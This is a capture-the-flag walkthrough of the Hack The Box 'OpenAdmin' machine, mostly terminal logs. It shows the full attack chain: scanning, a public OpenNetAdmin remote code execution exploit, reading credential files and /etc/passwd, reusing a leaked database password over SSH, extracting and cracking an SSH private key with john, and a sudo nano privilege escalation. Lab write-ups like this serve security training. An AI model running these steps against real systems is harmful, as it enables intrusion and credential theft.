@@ -1,0 +1,274 @@
+// walk through
+
+root@kali:~# nmap -sC -sV -T5 10.10.10.171
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-09 03:04 EDT
+Warning: 10.10.10.171 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.10.171
+Host is up (0.24s latency).
+Not shown: 989 closed ports
+PORT      STATE    SERVICE        VERSION
+22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp    open     http           Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+691/tcp   filtered resvc
+1059/tcp  filtered nimreg
+1104/tcp  filtered xrl
+1296/tcp  filtered dproxy
+1521/tcp  filtered oracle
+1972/tcp  filtered intersys-cache
+2105/tcp  filtered eklogin
+6839/tcp  filtered unknown
+60443/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 43.81 seconds
+
+//use dirbuster to looking for the http directory
+
+//root@kali:~# found opennetadmin page and version v18.1.1 in 10.10.10.171/ona
+
+//check opennetadmin vulnerability under v18.1.1, found bash code to expolit 
+// https://www.exploit-db.com/exploits/47691
+
+root@kali:~# bash opennetadmin.sh http://10.10.10.171/ona/
+$ ls
+config
+config_dnld.php
+dcm.php
+images
+include
+index.php
+local
+login.php
+logout.php
+modules
+plugins
+winc
+workspace_plugins
+$ pwd              
+/opt/ona/www
+$ whoami
+www-data
+
+// exploit under the www-data user
+
+$ find / -type d -user www-data
+
+$ cat /opt/ona/www/config_dnld.php
+$ cat /opt/ona/www/config/auth_ldap.config.php
+$ ls /opt/ona/www/local/config
+database_settings.inc.php
+motd.txt.example
+run_installer
+$ cat /opt/ona/www/local/config/database_settings.inc.php
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' => 
+  array (
+    'databases' => 
+    array (
+      0 => 
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+
+root@kali:~# ssh jimmy@10.10.10.171     // use the db password "n1nj4W4rri0R!"
+
+jimmy@openadmin:~$ ls /var/www/ -l
+total 8
+drwxr-xr-x 6 www-data www-data 4096 Nov 22 15:59 html
+drwxrwx--- 2 jimmy    internal 4096 Nov 23 17:43 internal
+lrwxrwxrwx 1 www-data www-data   12 Nov 21 16:07 ona -> /opt/ona/www
+jimmy@openadmin:~$ ls /var/www/internal/ -l
+total 12
+-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php
+-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
+-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
+jimmy@openadmin:~$ cat /var/www/internal/main.php 
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
+# Open Admin Trusted
+# OpenAdmin
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "<pre>$output</pre>";
+?>
+<html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+
+jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/
+internal.conf   openadmin.conf  
+
+jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf 
+Listen 127.0.0.1:52846
+
+<VirtualHost 127.0.0.1:52846>
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+    <IfModule mpm_itk_module>
+AssignUserID joanna joanna
+</IfModule>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+
+jimmy@openadmin:~$ curl http://127.0.0.1:52846/main.php
+<pre>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+</pre><html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+
+
+// save the rsa file into the kali 
+
+root@kali:~# python /usr/share/john//ssh2john.py joana.rsa > joana.rsa.hash
+
+root@kali:~# /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt joana.rsa.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/32])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (joana.rsa)
+1g 0:00:00:13 DONE (2020-03-09 04:01) 0.07209g/s 1034Kp/s 1034Kc/s 1034KC/sa6_123..*7¡Vamos!
+Session completed
+
+root@kali:~# chmod 700 joana.rsa
+root@kali:~# ssh -i joana.rsa joanna@10.10.10.171   // use "bloodninjas" for phasepas
+Enter passphrase for key 'joana.rsa': 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Mar  9 08:06:14 UTC 2020
+
+  System load:  0.1               Processes:             146
+  Usage of /:   50.1% of 7.81GB   Users logged in:       2
+  Memory usage: 21%               IP address for ens160: 10.10.10.171
+  Swap usage:   0%
+
+  => There is 1 zombie process.
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+41 packages can be updated.
+12 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Mar  9 07:54:03 2020 from 10.10.15.133
+joanna@openadmin:~$ 
+joanna@openadmin:~$ 
+joanna@openadmin:~$ ls
+user.txt
+joanna@openadmin:~$ cat user.txt 
+
+##################################################################
+
+joanna@openadmin:~$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+
+// noticed that nopasswd for running /bin/nano /opt/priv
+
+joanna@openadmin:~$ sudo nano  /opt/priv 
+
+// crtl + R to read /root/root.txt
+
+
